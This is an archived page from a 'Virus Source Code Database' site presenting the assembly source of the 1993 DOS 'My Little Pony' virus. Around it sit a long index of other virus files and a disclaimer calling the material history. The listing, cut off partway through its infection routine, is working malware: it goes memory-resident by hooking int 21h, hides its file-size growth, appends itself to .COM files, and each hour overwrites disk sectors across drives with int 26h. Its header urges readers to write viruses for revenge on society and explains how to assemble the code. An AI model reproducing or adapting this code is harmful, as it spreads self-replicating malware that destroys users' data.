<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: mlp-1307_asm</title>
<meta name="KEYWORDS" content="mlp-1307.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for mlp-1307.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="madden__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/madden__asm.php">madden__asm</a><br>
<a href="madden_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/madden_asm.php">madden_asm</a><br>
<a href="maddenb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/maddenb_asm.php">maddenb_asm</a><br>
<a href="made_334_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/made_334_asm.php">made_334_asm</a><br>
<a href="made-334_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/made-334_asm.php">made-334_asm</a><br>
<a href="made334_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/made334_asm.php">made334_asm</a><br>
<a href="makestnd_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/makestnd_asm.php">makestnd_asm</a><br>
<a href="maketorm_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/maketorm_asm.php">maketorm_asm</a><br>
<a href="malaria_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/malaria_asm.php">malaria_asm</a><br>
<a href="malmsey_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/malmsey_asm.php">malmsey_asm</a><br>
<a href="manvir_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/manvir_asm.php">manvir_asm</a><br>
<a href="mar_860_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mar_860_asm.php">mar_860_asm</a><br>
<a href="mar-860__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mar-860__asm.php">mar-860__asm</a><br>
<a href="mar-860_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mar-860_asm.php">mar-860_asm</a><br>
<a href="maria_k_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/maria_k_asm.php">maria_k_asm</a><br>
<a href="maria-k_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/maria-k_asm.php">maria-k_asm</a><br>
<a href="marked_x_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/marked_x_asm.php">marked_x_asm</a><br>
<a href="marked-x_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/marked-x_asm.php">marked-x_asm</a><br>
<a href="mark_ii_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mark_ii_asm.php">mark_ii_asm</a><br>
<a href="mark-ii_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mark-ii_asm.php">mark-ii_asm</a><br>
<a href="maruad_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/maruad_asm.php">maruad_asm</a><br>
<a href="massacre_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/massacre_asm.php">massacre_asm</a><br>
<a href="master_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/master_asm.php">master_asm</a><br>
<a href="mataj13_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mataj13_asm.php">mataj13_asm</a><br>
<a href="matt_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/matt_asm.php">matt_asm</a><br>
<a href="max_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/max_asm.php">max_asm</a><br>
<a href="mbug1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mbug1_asm.php">mbug1_asm</a><br>
<a href="mcwhale_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mcwhale_asm.php">mcwhale_asm</a><br>
<a href="megabug_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/megabug_asm.php">megabug_asm</a><br>
<a href="megastel_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/megastel_asm.php">megastel_asm</a><br>
<a href="megatroj_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/megatroj_asm.php">megatroj_asm</a><br>
<a href="meltdown_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/meltdown_asm.php">meltdown_asm</a><br>
<a href="met_moon_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/met_moon_asm.php">met_moon_asm</a><br>
<a href="met-moon_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/met-moon_asm.php">met-moon_asm</a><br>
<a href="mg1a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mg1a_asm.php">mg1a_asm</a><br>
<a href="mg1b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mg1b_asm.php">mg1b_asm</a><br>
<a href="mg1c_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mg1c_asm.php">mg1c_asm</a><br>
<a href="mg1d_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mg1d_asm.php">mg1d_asm</a><br>
<a href="mg2_____asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mg2_____asm.php">mg2_____asm</a><br>
<a href="mg2____asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mg2____asm.php">mg2____asm</a><br>
<a href="mg2___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mg2___asm.php">mg2___asm</a><br>
<a href="mg2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mg2_asm.php">mg2_asm</a><br>
<a href="mg_3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mg_3_asm.php">mg_3_asm</a><br>
<a href="mg-3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mg-3_asm.php">mg-3_asm</a><br>
<a href="mg3__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mg3__asm.php">mg3__asm</a><br>
<a href="mg3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mg3_asm.php">mg3_asm</a><br>
<a href="mgagent1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mgagent1_asm.php">mgagent1_asm</a><br>
<a href="mgagent2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mgagent2_asm.php">mgagent2_asm</a><br>
<a href="mgagent3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mgagent3_asm.php">mgagent3_asm</a><br>
<a href="mg__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mg__asm.php">mg__asm</a><br>
<a href="m-gen_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/m-gen_asm.php">m-gen_asm</a><br>
<a href="mgtest1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mgtest1_asm.php">mgtest1_asm</a><br>
<a href="mgtest2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mgtest2_asm.php">mgtest2_asm</a><br>
<a href="m_hivb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/m_hivb_asm.php">m_hivb_asm</a><br>
<a href="m-hivb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/m-hivb_asm.php">m-hivb_asm</a><br>
<a href="mich2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mich2_asm.php">mich2_asm</a><br>
<a href="michangl_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/michangl_asm.php">michangl_asm</a><br>
<a href="mich_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mich_asm.php">mich_asm</a><br>
<a href="michel2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/michel2_asm.php">michel2_asm</a><br>
<a href="michel_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/michel_asm.php">michel_asm</a><br>
<a href="michfile_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/michfile_asm.php">michfile_asm</a><br>
<a href="mich_ld_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mich_ld_asm.php">mich_ld_asm</a><br>
<a href="mich-ld_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mich-ld_asm.php">mich-ld_asm</a><br>
<a href="micro29_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/micro29_asm.php">micro29_asm</a><br>
<a href="mike_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mike_asm.php">mike_asm</a><br>
<a href="mike_c.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mike_c.php">mike_c</a><br>
<a href="mikey_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mikey_asm.php">mikey_asm</a><br>
<a href="mindles__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mindles__asm.php">mindles__asm</a><br>
<a href="mindless_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mindless_asm.php">mindless_asm</a><br>
<a href="mindlss_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mindlss_asm.php">mindlss_asm</a><br>
<a href="mini_35_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mini_35_asm.php">mini_35_asm</a><br>
<a href="mini-35_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mini-35_asm.php">mini-35_asm</a><br>
<a href="mini40__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mini40__asm.php">mini40__asm</a><br>
<a href="mini40_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mini40_asm.php">mini40_asm</a><br>
<a href="mini_42b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mini_42b_asm.php">mini_42b_asm</a><br>
<a href="mini-42b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mini-42b_asm.php">mini-42b_asm</a><br>
<a href="mini_45_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mini_45_asm.php">mini_45_asm</a><br>
<a href="mini_68_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mini_68_asm.php">mini_68_asm</a><br>
<a href="mini-68_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mini-68_asm.php">mini-68_asm</a><br>
<a href="mini_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mini_asm.php">mini_asm</a><br>
<a href="minimal_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/minimal_asm.php">minimal_asm</a><br>
<a href="miniscul_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/miniscul_asm.php">miniscul_asm</a><br>
<a href="misery_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/misery_asm.php">misery_asm</a><br>
<a href="mix1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mix1_asm.php">mix1_asm</a><br>
<a href="mkworm_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mkworm_asm.php">mkworm_asm</a><br>
<a href="ml_366a__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/ml_366a__asm.php">ml_366a__asm</a><br>
<a href="ml_366a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/ml_366a_asm.php">ml_366a_asm</a><br>
<a href="ml366a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/ml366a_asm.php">ml366a_asm</a><br>
<a href="mlp_1307_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mlp_1307_asm.php">mlp_1307_asm</a><br>
<a href="mlp-1307_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mlp-1307_asm.php">mlp-1307_asm</a><br>
<a href="mm_122_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mm_122_asm.php">mm_122_asm</a><br>
<a href="mmirdest_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mmirdest_asm.php">mmirdest_asm</a><br>
<a href="mmirfade_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mmirfade_asm.php">mmirfade_asm</a><br>
<a href="mmirlisa_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mmirlisa_asm.php">mmirlisa_asm</a><br>
<a href="mmirmoon_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mmirmoon_asm.php">mmirmoon_asm</a><br>
<a href="mmirunkn_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mmirunkn_asm.php">mmirunkn_asm</a><br>
<a href="m_murph1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/m_murph1_asm.php">m_murph1_asm</a><br>
<a href="m-murph1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/m-murph1_asm.php">m-murph1_asm</a><br>
<a href="m_murph2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/m_murph2_asm.php">m_murph2_asm</a><br>
<a href="m-murph2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/m-murph2_asm.php">m-murph2_asm</a><br>
<a href="m-murph__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/m-murph__asm.php">m-murph__asm</a><br>
<a href="mojave_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mojave_asm.php">mojave_asm</a><br>
<a href="monami_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/monami_asm.php">monami_asm</a><br>
<a href="monkeys_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/monkeys_asm.php">monkeys_asm</a><br>
<a href="monxla_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/monxla_asm.php">monxla_asm</a><br>
<a href="mordor_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mordor_asm.php">mordor_asm</a><br>
<a href="morgoth__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/morgoth__asm.php">morgoth__asm</a><br>
<a href="morgoth_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/morgoth_asm.php">morgoth_asm</a><br>
<a href="mpc-783_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mpc-783_asm.php">mpc-783_asm</a><br>
<a href="mpciguan_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mpciguan_asm.php">mpciguan_asm</a><br>
<a href="mpcsnort_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mpcsnort_asm.php">mpcsnort_asm</a><br>
<a href="mpsopc31_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mpsopc31_asm.php">mpsopc31_asm</a><br>
<a href="mpsopc32_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mpsopc32_asm.php">mpsopc32_asm</a><br>
<a href="msdos_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/msdos_asm.php">msdos_asm</a><br>
<a href="mte_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mte_asm.php">mte_asm</a><br>
<a href="m_torma_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/m_torma_asm.php">m_torma_asm</a><br>
<a href="m-torma_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/m-torma_asm.php">m-torma_asm</a><br>
<a href="muad'di__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/muad'di__asm.php">muad'di__asm</a><br>
<a href="muad_dib_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/muad_dib_asm.php">muad_dib_asm</a><br>
<a href="muad'dib_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/muad'dib_asm.php">muad'dib_asm</a><br>
<a href="mudshark_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mudshark_asm.php">mudshark_asm</a><br>
<a href="multiflu_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/multiflu_asm.php">multiflu_asm</a><br>
<a href="multiplx_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/multiplx_asm.php">multiplx_asm</a><br>
<a href="mummy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mummy_asm.php">mummy_asm</a><br>
<a href="mumzi!_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mumzi!_asm.php">mumzi!_asm</a><br>
<a href="murphexe_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/murphexe_asm.php">murphexe_asm</a><br>
<a href="murphy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/murphy_asm.php">murphy_asm</a><br>
<a href="musicbug_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/musicbug_asm.php">musicbug_asm</a><br>
<a href="mutate_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mutate_asm.php">mutate_asm</a><br>
<a href="mutatint_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mutatint_asm.php">mutatint_asm</a><br>
<a href="mut_gard_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mut_gard_asm.php">mut_gard_asm</a><br>
<a href="mutint_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mutint_asm.php">mutint_asm</a><br>
<a href="mut-tiny_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mut-tiny_asm.php">mut-tiny_asm</a><br>
<a href="muttiny_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/muttiny_asm.php">muttiny_asm</a><br>
<a href="mystic_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mystic_asm.php">mystic_asm</a><br>
<a href="mystic-b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mystic-b_asm.php">mystic-b_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

                .model tiny
                .code

                org     100h

start:

;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=;
;                    A NEW ORDER OF INTELLIGENCE PRESENTS:                     ;
;                             My Little Pony 1.00                              ;
;           Copyright (c) 1992, 1993 by Cruel Entity / Macaroni Ted            ;
;                                 - A.N.O.I -                                  ;
;                                                                              ;
;                                                                              ;
; I know that there is a much better documented source-code for this	       ;
; virus. And I'm also very interessted to get in touch with the guy	       ;
; who did that documentation. Please contact me.                               ;
;                                                                              ;
; You may freely use this code as you want, just give me some of the	       ;
; credits. Please learn to create virus, so we, together can get our	       ;
; revenge to the soceity. Learn to feel the feeling being cruel!               ;
;                                                                              ;
; Of cource I can't take any responsibility for all virus-coders	       ;
; who use any of the routines in this virus.                                   ;
;                                                                              ;
;                                                                              ;
; Greetings to;  The Unforgiven for giving me AT&T's                           ;
;                Immortal Riot's members '94                                   ;
;                The man sitting in basement                                   ;
;                                                                              ;
; ps! Tasm /m3 and tlink /t to get this babe into executable!
;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=;

start:
                call    $+3
sub_this:       pop     bp

                mov     ax,0dd22h                ;are we already in memory?
                int     21h
                cmp     ax,03d33h
                jne     $+7
                lea     dx,[bp+(cancel-sub_this)]
                jmp     far ptr dx

                mov     ax,3521h                ;get int 21h vect
                int     21h
                mov     [bp+(int_21h_off-sub_this)],bx
                mov     [bp+(int_21h_seg-sub_this)],es

                mov     ax,cs
                dec     ax
                mov     es,ax
                mov     ax,es:[0003h]
                sub     ax,[bp+(memlen-sub_this)]
                mov     es:[0003h],ax
                mov     ax,[bp+(memlen-sub_this)]
                sub     word ptr es:[0012h],ax
                mov     es,es:[0012h]
                push    es

                lea     si,[bp+(start-sub_this)]
                mov     di,0100h
                mov     cx,[bp+(filelen-sub_this)]
                rep     movsb

                pop     ds                      ;es => ds
                mov     ax,2521h                ;new vector at ES:0100
                lea     dx,new_int_21h
                int     21h
cancel:
                push    cs                      ;cs => ds => es
                push    cs
                pop     ds
                pop     es

                lea     si,[bp+(first_bytes-sub_this)]
                mov     cx,3
                mov     di,100h
                rep     movsb
                sub     di,3
                jmp     far ptr di

                db      'Simple Simon met a pieman going to the fair said'
                db      ' Simple Simon to the pieman let me take your ware'
write_rnd_sector:
                cmp     dh,0            ;sec
                jne     back

                cmp     dl,5            ;100th
                ja      back


                pushf                   ;fuck rnd sector
                push    bx

                call    get_rnd
                mov     cx,10           ;/ 10
                xor     dx,dx
                div     cx
                mov     dx,ax           ;dx=ax

                mov     al,2h           ; Drive #, start with C:
                mov     cx,1h           ; # of sectors to overwrite
                lea     bx,logo         ; Address to overwriting DATA
loopie:
                int     26h
                popf
                inc     al
                cmp     al,25
                jne     loopie


                pop     bx
                popf
                jmp     back

                db      '(c)1993 Cruel Entity'

;- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
;                                 New int 21h
;- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
new_int_21h:
                pushf

                cmp     ax,0dd22h       ;check if resident
                je      mem_check

                cmp     ah,11h          ;find 1st old
                je      find_old
                cmp     ah,12h          ;find 1st old
                je      find_old

                cmp     ah,4eh                  ;dos 2.x
                je      find_
                cmp     ah,4fh
                je      find_

                cmp     ah,3dh          ;open
                je      open_

                cmp     ah,3eh          ;close
                je      close_

                cmp     ah,2ch
                je      back2

                push    ax
                push    cx
                push    dx

                mov     ah,2ch
                int     21h

                cmp     cl,00                   ;a new hour?
                je      write_rnd_sector
back:
                pop     dx
                pop     cx
                pop     ax

back2:
                cmp     ah,36h
                jne     return_21h
                push    bp
                lea     bp,get_free_space
                jmp     far ptr bp
return_21h:
                popf

real_int_21h:   db      0eah            ;jmp...
int_21h_off     dw      ?               ;to old int 21h
int_21h_seg     dw      ?
;- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -


find_:
                push    bp
                lea     bp,find_new
                jmp     far ptr bp

open_:
                push    bp
                lea     bp,open
                jmp     far ptr bp
close_:
                push    bp
                lea     bp,close_file
                jmp     far ptr bp

mem_check:
                popf
                mov     ax,3d33h
                iret
call_int21h:
                jmp     dword ptr cs:int_21h_off   ;force a call to DOS
                ret

find_old:
                popf

                pushf                           ;find fcb
                push    cs
                call    call_int21h
                cmp     al,0ffh
                je      no_more_files

                pushf
                push    ax
                push    bx
                push    cx
                push    dx
                push    si
                push    di
                push    ds
                push    es
                push    bp

                mov     ah,2fh                  ;get dta
                int     21h

                push    es              ;es:bx
                pop     ds              ;ds:bx
                mov     si,bx           ;ds:si

                add     si,16           ;ext name
                lodsw
                cmp     ax,'OC'         ;.CO
                jne     cancel_ff
                lodsb
                cmp     al,'M'          ;M
                jne     cancel_ff
ext_ok:
                                         ;ext=com
                mov     si,bx            ;check size
                add     si,26h
                lodsw
                cmp     ax,0            ;=> 0ffffh?
                jne     cancel_ff

                mov     si,bx           ;check if already infected
                add     si,30
                lodsw                   ;time
                and     al,00011111b
                cmp     al,00001010b
                je      $+7            ;already infected (sec=24)
                lea     dx,store_in_mem
                jmp     far ptr dx

                mov     si,bx           ;alter size
                add     si,36
                mov     di,si
                lodsw
                sub     ax,cs:filelen
                jz      cancel_ff
                stosw
cancel_ff:
                pop     bp
                pop     es
                pop     ds
                pop     di
                pop     si
                pop     dx
                pop     cx
                pop     bx
                pop     ax
                popf
no_more_files:  retf    2               ;iret flags

           db      "%%% MY LITTLE PONY %%% COPYRIGHT(C) 1993 A.N.O.I. %%%"

store_in_mem:                           ;store filename in buffer
                mov     si,bx
                add     si,8

                push    cs              ;cs => es
                pop     es

                mov     cx,10
                lea     di,file_buffer  ;check pos
check_pos:
                cmp     byte ptr es:[di],20h
                je      store
                add     di,8
                loop    check_pos
                jmp     cancel_ff

store:
                mov     cx,8
                rep     movsb
                jmp     cancel_ff
;- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

get_free_space:
                pop     bp
                push    ax
                push    bx
                push    cx
                push    dx
                push    si
                push    di
                push    ds
                push    es
                push    bp

                push    cs              ;cs=> ds=> es
                push    cs
                pop     ds
                pop     es

                lea     di,file_buffer
                mov     cx,10
check_last:
                cmp     byte ptr [di],20h       ;check if last
                je      cancel_inf

                push    di
                push    cx
                mov     si,di           ;si=file pos
                call    infect
                pop     cx
                pop     di

                add     di,8
                loop    check_last
cancel_inf:
                push    cs
                pop     es
                lea     di,file_buffer
                mov     cx,80+12
                mov     al,20h
                rep     stosb

                pop     bp
                pop     es
                pop     ds
                pop     di
                pop     si
                pop     dx
                pop     cx
                pop     bx
                pop     ax
                popf
                jmp     real_int_21h

infect:
                                        ;convert filename to asciiz
                lea     di,filename
                mov     cx,8            ;filename NOT ext
cpy_filename:
                lodsb
                cmp     al,20h
                je      filename_klar
                stosb
                loop    cpy_filename
filename_klar:
                mov     al,'.'
                stosb
                mov     al,'C'
                stosb
                mov     al,'O'
                stosb
                mov     al,'M'
                stosb
                mov     al,0
                stosb

                push    cs
                pop     ds

                mov     ax,4300h        ;get attrib
                lea     dx,filename
                int     21h
                jnc     $+3             ;error?
                ret

                push    cx              ;save attrib

                xor     cx,cx
                mov     ax,4301h        ;force all attribs
                int     21h

                mov     ax,3d02h        ;open filename
                lea     dx,filename
                pushf
                push    cs
                call    call_int21h
                mov     bx,ax           ;save handle

                mov     ax,5700h        ;get time/date
                int     21h

                push    dx              ;save time/date
                push    cx

                and     cl,00011111b
                cmp     cl,00001010b
                jne     $+7            ;already infected (sec=24)
                lea     dx,cancel_inf2
                jmp     far ptr dx



                mov     ah,3fh                  ;read 3 first bytes
                mov     cx,3
                lea     dx,first_bytes
                int     21h

                mov     ax,4202h                ;goto eof
                xor     dx,dx
                xor     cx,cx
                int     21h

                sub     ax,3                    ;create a jmp
                mov     jmp_2,ax

                mov     ah,40h                  ;write virus
                mov     dx,100h
                mov     cx,filelen
                int     21h

                mov     ax,4200h                ;goto beg
                xor     dx,dx
                xor     cx,cx
                int     21h

                mov     ah,40h                  ;write jmp
                mov     cx,3
